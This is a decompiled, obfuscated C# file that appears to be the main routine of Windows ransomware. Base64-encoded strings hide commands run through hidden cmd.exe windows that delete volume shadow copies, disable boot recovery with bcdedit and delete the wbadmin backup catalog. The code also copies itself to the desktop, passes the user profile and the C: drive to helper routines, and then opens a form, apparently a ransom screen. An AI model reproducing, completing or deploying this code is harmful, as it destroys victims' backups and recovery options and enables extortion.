using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ns0;

internal static class Class0
{
	private static void smethod_0()
	{
		try
		{
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + Encoding.UTF8.GetString(Convert.FromBase64String("XA==")) + GClass2.string_3);
			GClass0.smethod_3();
			GClass0.smethod_5(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
			GClass0.smethod_6(Encoding.UTF8.GetString(Convert.FromBase64String("Qzpc")));
		}
		catch (Exception)
		{
		}
	}

	private static void smethod_1(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = Encoding.UTF8.GetString(Convert.FromBase64String("Y21kLmV4ZQ==")),
			Arguments = Encoding.UTF8.GetString(Convert.FromBase64String("L0Mg")) + string_0,
			WindowStyle = ProcessWindowStyle.Hidden
		};
		process.Start();
		process.WaitForExit();
	}

	private static void smethod_2(string args)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = Application.get_ExecutablePath(),
			Arguments = args,
			WindowStyle = ProcessWindowStyle.Hidden,
			WorkingDirectory = Path.GetDirectoryName(Application.get_ExecutablePath())
		};
		process.Start();
	}

	private static byte[] smethod_3(int int_0)
	{
		Random random = new Random();
		byte[] array = new byte[int_0];
		for (int i = 0; i < int_0; i++)
		{
			array[i] = (byte)random.Next(0, random.Next(10, 1000));
		}
		return array;
	}

	private static void smethod_4()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
		folderPath = folderPath + Encoding.UTF8.GetString(Convert.FromBase64String("XA==")) + GClass2.string_4;
		if (!File.Exists(folderPath))
		{
			smethod_2(Encoding.UTF8.GetString(Convert.FromBase64String("L2M=")));
		}
	}

	private static void smethod_5()
	{
		smethod_4();
		GClass1.smethod_3();
		string[] array = GClass1.smethod_2();
		foreach (string item in array)
		{
			try
			{
				if (!GClass0.list_0.Contains(item))
				{
					GClass0.list_0.Add(item);
				}
			}
			catch (Exception)
			{
			}
		}
		try
		{
			Thread thread = new Thread(smethod_0);
			thread.Start();
		}
		catch (Exception)
		{
			smethod_0();
		}
		Thread.Sleep(8000);
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new GForm1());
	}

	[STAThread]
	private static void Main()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
		folderPath = folderPath + Encoding.UTF8.GetString(Convert.FromBase64String("XA==")) + GClass2.string_4;
		string[] commandLineArgs = Environment.GetCommandLineArgs();
		if (commandLineArgs.Length > 1)
		{
			if (commandLineArgs[1] == Encoding.UTF8.GetString(Convert.FromBase64String("L3g=")))
			{
				smethod_1(Encoding.UTF8.GetString(Convert.FromBase64String("dnNzYWRtaW4gZGVsZXRlIHNoYWRvd3MgL2FsbCAvcXVpZXQgJiB3bWljIHNoYWRvd2NvcHkgZGVsZXRl")));
				smethod_1(Encoding.UTF8.GetString(Convert.FromBase64String("YmNkZWRpdCAvc2V0IHtkZWZhdWx0fSBib290c3RhdHVzcG9saWN5IGlnbm9yZWFsbGZhaWx1cmVzICYgYmNkZWRpdCAvc2V0IHtkZWZhdWx0fSByZWNvdmVyeWVuYWJsZWQgbm8=")));
				smethod_1(Encoding.UTF8.GetString(Convert.FromBase64String("d2JhZG1pbiBkZWxldGUgY2F0YWxvZyAtcXVpZXQ=")));
				File.WriteAllBytes(folderPath, smethod_3(512));
			}
			if (commandLineArgs[1] == Encoding.UTF8.GetString(Convert.FromBase64String("L2M=")))
			{
				Class1.smethod_1(Encoding.UTF8.GetString(Convert.FromBase64String("c3ZjaG9zdC5leGU=")));
				Environment.Exit(0);
			}
			if (commandLineArgs[1] == Encoding.UTF8.GetString(Convert.FromBase64String("L2E=")))
			{
				smethod_5();
			}
			Environment.Exit(0);
		}
		if (File.Exists(folderPath))
		{
			smethod_5();
		}
		else
		{
			Class1.smethod_0();
		}
	}
}
